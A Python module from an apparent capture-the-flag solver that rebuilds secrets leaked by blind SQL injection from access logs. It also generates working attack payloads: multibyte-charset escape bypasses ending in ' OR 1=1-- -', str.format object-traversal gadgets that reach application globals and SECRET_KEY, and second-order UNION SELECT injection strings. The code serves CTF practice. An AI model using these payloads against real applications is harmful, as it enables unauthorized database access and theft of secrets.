#!/usr/bin/env python3
"""SQLi engine: blind-from-log exfiltration, decode-mismatch bypasses, str.format/SSTI gadgets (B-022).

Four techniques that used to be hand-run on the Operation Dawn and pink SQLi challenges, each as an
offline, deterministic function so the solver (and a human operator) stops re-deriving them:

  * ``reconstruct_from_log`` -- the fully automatable one.  A time-based (or boolean/size-based) blind
    SQL injection leaks a secret one character at a time; the attacker's requests are preserved in the
    server's access log, so the log alone is the oracle's transcript.  Each probe asks
    ``IF(SUBSTR(<col>,<pos>,1)=<guess>, SLEEP(n), 0)`` and the "true" answers are the slow requests
    (or the ones with the distinguishing response size).  This function URL-decodes every probe,
    scores it against the chosen signal, and rebuilds the secret in position order.  This is what
    closes csctf "Operation Dawn: The Access Log" (9134) from the handout with no network.

  * ``multibyte_bypass_payloads`` -- decode-mismatch.  A server that escapes ``'`` to ``\\'`` is still
    injectable when the DB connection charset is a multibyte one (GBK/Big5/SJIS/...): a lead byte that
    forms a valid double-byte character with ``0x5c`` swallows the backslash, so the quote survives.
    The lead bytes are computed from the codec itself, never hard-coded, so the list is correct by
    construction (closes pink #30, "0x5C is not always a backslash").

  * ``format_traversal_gadgets`` -- Python ``str.format`` / SSTI object traversal.  Once untrusted text
    reaches ``"...{0}...".format(obj)`` the attacker can walk ``{0.__class__.__init__.__globals__[...]}``
    to application globals and config.  These are the gadget *strings* (closes csctf 9114, the dispatch
    console's format traversal after the stored-SQLi step).

  * ``second_order_probes`` -- stored / second-order SQLi.  A benign-looking value is stored on one
    request and fires when a later request reflects it into a query; the engine builds the store/trigger
    payload pair keyed by a unique marker.

The module has no HTTP client and renders no template: it only reads saved logs and returns payload
*strings* for an operator to place into an assigned request.  Challenge-derived logs are data: they are
parsed, never executed, and only ASCII SQL tokens are read out of them.

Entry: ``solve(challenge_dir, profile) -> SolverResult`` -- runs the blind-from-log reconstruction over
the handout and reports a recovered flag.  The other three techniques need live interaction with the
target, so they are exposed as library functions and on the command line, not from ``solve``.
"""
from __future__ import annotations

import argparse
import json
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Iterable, Sequence
from urllib.parse import unquote_plus

# ----------------------------------------------------------------------------- limits
MAX_LOG_BYTES = 128 * 1024 * 1024   # a handout "log" larger than this is not parsed
DEFAULT_THRESHOLD = 1.5             # seconds; a time-based true answer sleeps >= this
MAX_FILES = 64                      # log-like files inspected per challenge


class ReconstructError(ValueError):
    """The access log held probes but no usable oracle signal, or the answers are inconsistent."""


# ----------------------------------------------------------------------------- log parsing
# nginx combined (and most access-log) formats put the request line in the first quoted field and the
# numeric status + body size right after it.  We only need method/path/status/size + request time.
_REQUEST = re.compile(r'"(?P<method>[A-Z]+)\s+(?P<path>\S+)\s+HTTP/[\d.]+"\s+(?P<status>\d{3})\s+(?P<size>\d+|-)')
# request time: nginx `rt=0.057` tail, or a `request_time=` / `request_time:` field.
_RT = re.compile(r'(?:\brt=|request_time[=:]\s*)(?P<rt>\d+(?:\.\d+)?)')

# A boolean blind probe that targets one character of one column.  Two guess shapes:
#   SUBSTR(col,pos,1)='X'            -> char equality (char-eq)
#   ASCII(SUBSTR(col,pos,1))=65      -> codepoint equality (ascii-eq)
# SUBSTR / SUBSTRING / MID are accepted; the outer IF(...SLEEP...) wrapper is optional for size oracles.
_SUBSTR = r"(?:SUBSTR(?:ING)?|MID)\(\s*(?P<col>[\w.`\"]+)\s*,\s*(?P<pos>\d+)\s*,\s*1\s*\)"
_PROBE_CHAR = re.compile(_SUBSTR + r"\s*=\s*'(?P<char>(?:[^'\\]|\\.))'", re.IGNORECASE)
_PROBE_ASCII = re.compile(r"(?:ASCII|ORD|UNICODE)\(\s*" + _SUBSTR + r"\s*\)\s*=\s*(?P<code>\d{1,3})", re.IGNORECASE)
_SLEEP = re.compile(r"(?:SLEEP|PG_SLEEP)\(\s*(?P<secs>\d+(?:\.\d+)?)\s*\)|WAITFOR\s+DELAY", re.IGNORECASE)


@dataclass(frozen=True)
class Probe:
    """One recovered blind-SQLi guess: character ``char`` at 1-based ``pos`` of column ``column``."""
    column: str
    pos: int
    char: str                 # the guessed character (decoded)
    kind: str                 # "char-eq" | "ascii-eq"
    status: int
    size: int | None          # response body size, or None when the log wrote "-"
    rt: float | None          # request time in seconds, or None when the log has no rt field
    sleep: float | None       # the SLEEP() argument in the probe, when present


def _unescape_sql_char(raw: str) -> str:
    """Resolve a single SQL string literal character body (``X`` or ``\\X``) to one character."""
    if raw.startswith("\\") and len(raw) == 2:
        return {"n": "\n", "t": "\t", "r": "\r", "0": "\0"}.get(raw[1], raw[1])
    return raw


def parse_probe_query(query: str) -> tuple[str, int, str, str] | None:
    """Parse one URL-decoded request path/query into ``(column, pos, char, kind)`` or None.

    Tries the character-equality shape first, then the ASCII/codepoint shape.  ``pos`` is 1-based.
    """
    m = _PROBE_CHAR.search(query)
    if m:
        return m.group("col").strip('`"'), int(m.group("pos")), _unescape_sql_char(m.group("char")), "char-eq"
    m = _PROBE_ASCII.search(query)
    if m:
        code = int(m.group("code"))
        if 0 <= code <= 0x10FFFF:
            return m.group("col").strip('`"'), int(m.group("pos")), chr(code), "ascii-eq"
    return None


def extract_probes(text: str) -> list[Probe]:
    """Every blind-SQLi probe found in an access log, in log order.

    Each line's request path is URL-decoded (``+`` -> space, ``%7D`` -> ``}``) before the probe is read,
    because attackers percent-encode guessed characters.  Lines without a parseable request line or
    without a probe are skipped.  The log is untrusted data: only the SQL token structure is read.
    """
    probes: list[Probe] = []
    for line in text.splitlines():
        req = _REQUEST.search(line)
        if not req:
            continue
        query = unquote_plus(req.group("path"))
        parsed = parse_probe_query(query)
        if not parsed:
            continue
        column, pos, char, kind = parsed
        rt_m = _RT.search(line)
        sleep_m = _SLEEP.search(query)
        size = None if req.group("size") == "-" else int(req.group("size"))
        probes.append(Probe(
            column=column, pos=pos, char=char, kind=kind,
            status=int(req.group("status")), size=size,
            rt=float(rt_m.group("rt")) if rt_m else None,
            sleep=float(sleep_m.group("secs")) if (sleep_m and sleep_m.group("secs")) else None,
        ))
    return probes


# ----------------------------------------------------------------------------- reconstruction
@dataclass(frozen=True)
class Reconstruction:
    """The secret rebuilt from blind-SQLi probes, with the oracle signal used and any ambiguity."""
    text: str                               # positions with no single true char are filled with "?"
    column: str
    signal: str                             # "time" | "size"
    positions: tuple[int, ...]
    probe_count: int
    ambiguous: dict[int, tuple[str, ...]]   # position -> the >1 (or 0) true chars found there

    @property
    def complete(self) -> bool:
        return not self.ambiguous and "?" not in self.text


def _pick_signal(probes: Sequence[Probe], threshold: float) -> str:
    """Decide which oracle signal separates true answers from false: request time or response size.

    Time wins when the request times straddle the threshold (some slow, some fast).  Otherwise, a
    response body that takes exactly two distinct sizes is a boolean oracle.  Neither -> ReconstructError.
    """
    rts = [p.rt for p in probes if p.rt is not None]
    if rts and any(r >= threshold for r in rts) and any(r < threshold for r in rts):
        return "time"
    sizes = {p.size for p in probes if p.size is not None}
    if len(sizes) == 2:
        return "size"
    if rts and any(r >= threshold for r in rts):
        return "time"
    raise ReconstructError(
        "no usable oracle signal: request times do not straddle the threshold and the response size "
        "is not two-valued (give --threshold, or the log is not a time/size blind oracle)")


def _true_size(probes: Sequence[Probe]) -> int:
    """For a size oracle, the body size that marks a true guess: the rarer of the two observed sizes.

    An equality scan guesses many characters per position but only one is correct, so true answers are
    the minority.  Ties (equal counts) are ambiguous -> ReconstructError.
    """
    counts: dict[int, int] = {}
    for p in probes:
        if p.size is not None:
            counts[p.size] = counts.get(p.size, 0) + 1
    if len(counts) != 2:
        raise ReconstructError(f"size oracle needs exactly two response sizes, saw {sorted(counts)}")
    (s1, c1), (s2, c2) = sorted(counts.items(), key=lambda kv: kv[1])
    if c1 == c2:
        raise ReconstructError(f"size oracle is undecidable: both sizes occur {c1} times")
    return s1


def _is_true(probe: Probe, signal: str, threshold: float, true_size: int | None) -> bool:
    if signal == "time":
        return probe.rt is not None and probe.rt >= threshold
    return probe.size is not None and probe.size == true_size


def reconstruct(probes: Sequence[Probe], *, signal: str = "auto",
                threshold: float = DEFAULT_THRESHOLD) -> Reconstruction:
    """Rebuild the leaked secret from blind-SQLi probes.

    ``signal`` is ``"auto"`` (pick time or size), ``"time"`` (rt >= ``threshold`` is true) or ``"size"``
    (the minority response size is true).  A position with no true guess is filled with ``"?"`` and a
    position with more than one true guess is recorded in ``ambiguous``; neither raises, so the caller
    can still report a partial read.  An empty probe list or a column mismatch raises ReconstructError.
    """
    if not probes:
        raise ReconstructError("no blind-SQLi probes in the log")
    columns = {p.column for p in probes}
    if len(columns) != 1:
        raise ReconstructError(f"probes target more than one column: {sorted(columns)}")
    column = next(iter(columns))

    if signal == "auto":
        signal = _pick_signal(probes, threshold)
    elif signal not in ("time", "size"):
        raise ReconstructError(f"unknown signal {signal!r}")
    true_size = _true_size(probes) if signal == "size" else None

    hits: dict[int, list[str]] = {}
    positions: set[int] = set()
    for p in probes:
        positions.add(p.pos)
        if _is_true(p, signal, threshold, true_size):
            hits.setdefault(p.pos, [])
            if p.char not in hits[p.pos]:
                hits[p.pos].append(p.char)

    ordered = tuple(sorted(positions))
    out: list[str] = []
    ambiguous: dict[int, tuple[str, ...]] = {}
    for pos in ordered:
        chars = hits.get(pos, [])
        if len(chars) == 1:
            out.append(chars[0])
        else:
            out.append("?")
            ambiguous[pos] = tuple(chars)
    return Reconstruction(text="".join(out), column=column, signal=signal,
                          positions=ordered, probe_count=len(probes), ambiguous=ambiguous)


def reconstruct_from_log(text: str, *, signal: str = "auto",
                         threshold: float = DEFAULT_THRESHOLD) -> Reconstruction:
    """Convenience: extract probes from raw log text and reconstruct in one call."""
    return reconstruct(extract_probes(text), signal=signal, threshold=threshold)


# ----------------------------------------------------------------------------- decode-mismatch
# Multibyte DB connection charsets where a lead byte can absorb the backslash (0x5c) that addslashes /
# mysql_real_escape_string prepends to a quote, so the quote survives the escape.  The actual lead
# bytes are computed from the codec, never hard-coded, so the list cannot drift from reality.
MULTIBYTE_CHARSETS: tuple[str, ...] = ("gbk", "gb18030", "big5", "shift_jis", "euc_jp", "euc_kr")
_ESCAPED_QUOTE = b"\\'"             # what the server produces from a single quote: 0x5c 0x27


def absorbing_lead_bytes(charset: str) -> list[int]:
    """Lead bytes ``b`` (0x81..0xfe) for which ``bytes([b, 0x5c])`` decodes to a single character.

    Such a byte "eats" the backslash an escaper puts before a quote, so the following ``0x27`` is left
    as a live quote.  Computed by trial-decoding against the real codec; an unknown codec raises
    LookupError (loud, no silent fallback).
    """
    "".encode(charset)             # LookupError now if the codec name is wrong
    leads: list[int] = []
    for b in range(0x81, 0xFF):
        pair = bytes([b, 0x5C])
        try:
            if len(pair.decode(charset)) == 1:
                leads.append(b)
        except UnicodeDecodeError:
            continue
    return leads


def quote_survives(lead: int, charset: str) -> bool:
    """True when prefixing ``lead`` makes an escaped quote (``\\'``) leave a live ``'`` after decode.

    The server stores bytes ``lead 0x5c 0x27``; under ``charset`` the first two bytes form one character
    and the final ``0x27`` decodes to ``'`` on its own.  This is the exact condition the bypass needs.
    """
    raw = bytes([lead]) + _ESCAPED_QUOTE
    try:
        decoded = raw.decode(charset)
    except UnicodeDecodeError:
        return False
    return len(decoded) == 2 and decoded[-1] == "'"


@dataclass(frozen=True)
class BypassPayload:
    charset: str
    lead: int
    raw: bytes                 # the bytes to send for the quote, before the injected tail
    percent: str               # URL/percent-encoded form of raw + tail
    note: str


def multibyte_bypass_payloads(tail: str = " OR 1=1-- -", charsets: Iterable[str] = MULTIBYTE_CHARSETS,
                              max_per_charset: int = 3) -> list[BypassPayload]:
    """Decode-mismatch payloads that smuggle a live quote past a backslash-escaping server.

    For each multibyte ``charset`` and each absorbing lead byte, builds ``<lead>%27<tail>``: the raw
    ``%27`` is what you send, the server escapes it to ``\\'`` and the lead swallows the backslash.
    ``tail`` is the SQL you want to run after the surviving quote.  Only lead bytes that actually leave
    a live quote (``quote_survives``) are emitted.
    """
    out: list[BypassPayload] = []
    for charset in charsets:
        leads = [b for b in absorbing_lead_bytes(charset) if quote_survives(b, charset)]
        for lead in leads[:max_per_charset]:
            raw = bytes([lead]) + b"'"
            percent = f"%{lead:02x}%27" + "".join(_percent(c) for c in tail)
            out.append(BypassPayload(
                charset=charset, lead=lead, raw=raw, percent=percent,
                note=(f"{charset}: send %{lead:02x}%27; server escapes %27 to \\' (0x5c27); "
                      f"0x{lead:02x}5c is one {charset} char, so %27 stays a live quote")))
    return out


def _percent(ch: str) -> str:
    """Percent-encode one character for a query string, leaving the SQL-safe unreserved set alone."""
    if ch in " ":
        return "%20"
    if ch.isalnum() or ch in "-_.~=":
        return ch
    return "".join(f"%{b:02x}" for b in ch.encode("utf-8"))


# ----------------------------------------------------------------------------- str.format / SSTI
# Python str.format field names that walk from a user-controlled object to application internals.  These
# reach interpreters via `"...{user}...".format(user=obj)` or `str.format_map`, the dispatch-console gap.
_GLOBALS_ROUTE = "__class__.__init__.__globals__"


def format_traversal_gadgets(root: str = "0", globals_keys: Sequence[str] = ("config", "SECRET_KEY"),
                             attr_targets: Sequence[str] = ("secret", "flag", "token")) -> list[str]:
    """Python ``str.format`` object-traversal gadgets rooted at field ``root``.

    ``root`` is the format field that holds the attacker-reachable object (``"0"`` for positional,
    a name for keyword).  Produces, in order: the object's module globals, each ``globals_keys`` lookup
    under that globals dict, and each direct ``attr_targets`` attribute.  Every returned string is a
    well-formed ``str.format`` template (verified by ``string.Formatter().parse``); none is executed.
    """
    import string
    gadgets = [f"{{{root}.{_GLOBALS_ROUTE}}}"]
    for key in globals_keys:
        gadgets.append(f"{{{root}.{_GLOBALS_ROUTE}[{key}]}}")
    for attr in attr_targets:
        gadgets.append(f"{{{root}.{attr}}}")
    fmt = string.Formatter()
    for g in gadgets:
        list(fmt.parse(g))        # ValueError if a gadget is not a valid format string
    return gadgets


# ----------------------------------------------------------------------------- stored / second-order
@dataclass(frozen=True)
class SecondOrderProbe:
    marker: str
    store: str                 # value to store on the first (write) request
    trigger_note: str          # how the stored value fires on the later (read) request


def second_order_probes(marker: str = "s2probe", columns: Sequence[str] = ("flag", "secret")) -> list[SecondOrderProbe]:
    """Stored / second-order SQLi payload pairs keyed by a unique ``marker``.

    Each probe stores a value whose SQL only matters when a *later* request concatenates it back into a
    query (second order).  The marker makes the stored row findable, and the UNION reads one ``columns``
    value.  The caller stores ``store`` on the write path, then replays the read path that reflects it.
    """
    probes: list[SecondOrderProbe] = []
    for col in columns:
        store = f"{marker}' UNION SELECT {col},NULL-- -"
        probes.append(SecondOrderProbe(
            marker=marker, store=store,
            trigger_note=(f"store {store!r} (survives escaping as a stored string); it injects only when "
                          f"a later request inlines the stored value into a query that selects {col}")))
    return probes


# ----------------------------------------------------------------------------- engine entry
_LOG_EXTS = (".log", ".txt", ".jsonl")
_LOG_NAME_HINTS = ("access", "log", "nginx", "apache")


def _candidate_logs(challenge_dir: Path) -> list[Path]:
    """Handout files that could be access logs: a log/text extension, or a name that hints at a log."""
    found: list[Path] = []
    for p in sorted(challenge_dir.rglob("*")):
        if not p.is_file():
            continue
        name = p.name.lower()
        if p.suffix.lower() in _LOG_EXTS or any(h in name for h in _LOG_NAME_HINTS):
            try:
                if p.stat().st_size <= MAX_LOG_BYTES:
                    found.append(p)
            except OSError:
                continue
        if len(found) >= MAX_FILES:
            break
    return found


def solve(challenge_dir, profile, *, signal: str = "auto",
          threshold: float = DEFAULT_THRESHOLD, **_opts):
    """Reconstruct a blind-SQLi-exfiltrated secret from an access log in the handout.

    ``solved`` when the rebuilt string is in the event flag format; ``candidate`` when it is complete but
    not a flag (e.g. a column value, or the wrong oracle picked); ``unsure`` when probes were found but
    the read is ambiguous/partial; ``none`` when no blind-SQLi probes are in the handout.  Reads logs as
    data only; never contacts the target.  The decode-mismatch and str.format techniques need a live
    target and are not run here (see the module functions / CLI).
    """
    from ctf.result import SolverResult, Evidence
    from ctf import flagfmt

    challenge_dir = Path(challenge_dir)
    ff = flagfmt.for_profile(profile)
    logs = _candidate_logs(challenge_dir)
    if not logs:
        return SolverResult(status="none", engine="web.sqli_exfil",
                            notes="no access-log file in the handout")

    best: tuple[Path, Reconstruction] | None = None
    scanned: list[str] = []
    for log in logs:
        try:
            text = log.read_bytes().decode("latin-1")   # logs are ASCII SQL + bytes; latin-1 never errors
        except OSError as e:
            scanned.append(f"{log.name}: unreadable ({e})")
            continue
        probes = extract_probes(text)
        if not probes:
            continue
        try:
            recon = reconstruct(probes, signal=signal, threshold=threshold)
        except ReconstructError as e:
            scanned.append(f"{log.name}: {len(probes)} probes but {e}")
            continue
        rel = str(log.relative_to(challenge_dir))
        if best is None or (recon.complete and not best[1].complete):
            best = (log, recon)
        scanned.append(f"{rel}: {recon.probe_count} probes, {recon.signal} oracle, "
                       f"column {recon.column}, {len(recon.positions)} positions")

    if best is None:
        note = "no blind-SQLi probes recovered"
        if scanned:
            note += "; " + "; ".join(scanned)
        return SolverResult(status="none", engine="web.sqli_exfil", notes=note)

    log, recon = best
    rel = str(log.relative_to(challenge_dir))
    ev = Evidence(kind="oracle",
                  detail=(f"blind SQLi on column {recon.column}: {recon.probe_count} probes, "
                          f"{recon.signal} oracle, rebuilt {len(recon.positions)} positions -> {recon.text!r}"),
                  path=rel)
    note = "; ".join(scanned)
    flags = ff.find_flags(recon.text)
    if flags:
        return SolverResult(status="solved", flags=tuple(flags), evidence=(ev,),
                            engine="web.sqli_exfil",
                            notes=f"rebuilt from {recon.signal} blind SQLi in {rel}; {note}")
    if recon.complete:
        return SolverResult(status="candidate", flags=(recon.text,), evidence=(ev,),
                            engine="web.sqli_exfil",
                            notes=(f"rebuilt {recon.column}={recon.text!r} from {recon.signal} blind SQLi "
                                   f"in {rel}, not in the event flag format; {note}"))
    return SolverResult(status="unsure", evidence=(ev,), engine="web.sqli_exfil",
                        notes=(f"partial read {recon.text!r} of {recon.column} from {rel}: "
                               f"positions {sorted(recon.ambiguous)} ambiguous/missing; {note}"))


# ----------------------------------------------------------------------------- CLI (manual use)
def _main(argv: Sequence[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description="SQLi engine: blind-from-log, decode-mismatch, format gadgets")
    sub = ap.add_subparsers(dest="cmd", required=True)

    r = sub.add_parser("reconstruct", help="rebuild a secret from a blind-SQLi access log")
    r.add_argument("log", type=Path)
    r.add_argument("--signal", choices=("auto", "time", "size"), default="auto")
    r.add_argument("--threshold", type=float, default=DEFAULT_THRESHOLD)

    d = sub.add_parser("decode-mismatch", help="multibyte charset addslashes-bypass payloads")
    d.add_argument("--tail", default=" OR 1=1-- -")

    g = sub.add_parser("format-gadgets", help="Python str.format object-traversal gadgets")
    g.add_argument("--root", default="0")

    s = sub.add_parser("second-order", help="stored/second-order SQLi payload pairs")
    s.add_argument("--marker", default="s2probe")

    args = ap.parse_args(argv)
    if args.cmd == "reconstruct":
        text = args.log.read_bytes().decode("latin-1")
        recon = reconstruct_from_log(text, signal=args.signal, threshold=args.threshold)
        print(json.dumps({"column": recon.column, "signal": recon.signal, "text": recon.text,
                          "positions": list(recon.positions), "probes": recon.probe_count,
                          "ambiguous": {str(k): v for k, v in recon.ambiguous.items()},
                          "complete": recon.complete}, indent=2))
    elif args.cmd == "decode-mismatch":
        payloads = multibyte_bypass_payloads(tail=args.tail)
        print(json.dumps([{"charset": p.charset, "lead": f"0x{p.lead:02x}", "percent": p.percent,
                           "note": p.note} for p in payloads], indent=2))
    elif args.cmd == "format-gadgets":
        print(json.dumps(format_traversal_gadgets(root=args.root), indent=2))
    elif args.cmd == "second-order":
        probes = second_order_probes(marker=args.marker)
        print(json.dumps([{"marker": p.marker, "store": p.store, "trigger": p.trigger_note}
                          for p in probes], indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(_main())
